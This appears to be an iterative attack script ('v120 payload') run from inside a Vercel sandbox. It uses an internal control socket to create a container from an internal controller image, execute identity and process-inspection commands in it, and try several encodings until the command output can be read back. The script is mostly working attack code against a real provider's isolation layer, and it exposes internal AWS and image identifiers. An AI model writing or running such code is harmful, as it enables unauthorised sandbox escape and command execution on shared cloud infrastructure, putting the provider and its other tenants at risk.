# -*- coding: utf-8 -*-
"""v120 payload: StreamOutput 加 output_stream 字段
v119 证明帧格式正确, 缺 "only stdout or stderr can be requested"
变体: proto f2=1/2/3, JSON outputStream=STDOUT/1/OUTPUT_STREAM_STDOUT
输出 /vercel/sandbox/v120c.out"""
import socket, struct, time, signal, json

OUT = '/vercel/sandbox/v120c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(220)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=2.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
        return status, payload
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    """去除 HTTP chunked 编码"""
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=15.0):
    """DATA帧(0x00+len+payload) + shutdown(SHUT_WR)"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        out = b''
        frames = []
        off = 0
        while off + 5 <= len(body):
            fl = body[off]
            ln = int.from_bytes(body[off + 1:off + 5], 'big')
            pay = body[off + 5:off + 5 + ln]
            frames.append(fl)
            out += pay
            off += 5 + ln
        return status, out, frames
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b'', []


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

log('=== P1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if not cid:
    f.close()
    raise SystemExit

st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('START -> %s' % st)

cmd = ("echo ===EXEC_START===; id; hostname; pwd; echo; "
       "cat /proc/1/cmdline 2>&1 | head -c 200; echo; echo ===EXEC_END===; sleep 40")
st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                       json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', cmd]}}).encode(), t=5)
log('EXEC -> %s %r' % (st, pay[:200]))
pid = None
try:
    pid = json.loads(pay.decode()).get('processId')
except Exception:
    pass
log('processId=%s' % pid)

# P2 变体矩阵
log('=== P2 variants ===')
if pid:
    pb = pid.encode()
    variants = []
    # proto: field1 process_id string, fieldN output_stream varint
    for fld, val, tag in [(2, 1, 'f2=1'), (2, 2, 'f2=2'), (3, 1, 'f3=1'), (4, 1, 'f4=1')]:
        payload = b'\x0a' + bytes([len(pb)]) + pb + bytes([(fld << 3) | 0]) + pvarint(val)
        variants.append(('P_' + tag, payload, 'application/connect+proto'))
    for name, val in [('STDOUT', None), ('OUTPUT_STREAM_STDOUT', None)]:
        variants.append(('J_' + name, json.dumps({'processId': pid, 'outputStream': name}).encode(),
                         'application/connect+json'))
    variants.append(('J_num1', json.dumps({'processId': pid, 'outputStream': 1}).encode(),
                     'application/connect+json'))
    variants.append(('J_num0', json.dumps({'processId': pid, 'outputStream': 0}).encode(),
                     'application/connect+json'))

    for name, payload, ctype in variants:
        st, out, frames = stream_data(CELL, '%s/StreamOutput' % PROC, payload, ctype, t=12)
        txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
        log('VAR %s [%s] -> %s frames=%s out=%r' % (name, ctype.split('+')[-1], st, frames, txt[:300]))
        if b'EXEC_START' in out or b'===EXEC' in out:
            log('!!!!! GOT OUTPUT in %s !!!!!' % name)
            log('FULL: %r' % out[:1500])

# P3 wait + 清理
log('=== P3 wait ===')
if pid:
    st, pay = connect_unix(CELL, '%s/Wait' % PROC, json.dumps({'processId': pid}).encode(), t=30)
    log('WAIT -> %s %r' % (st, pay[:200]))

st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('KILL -> %s %r' % (st, pay[:100]))

log('V120C_DONE')
f.close()
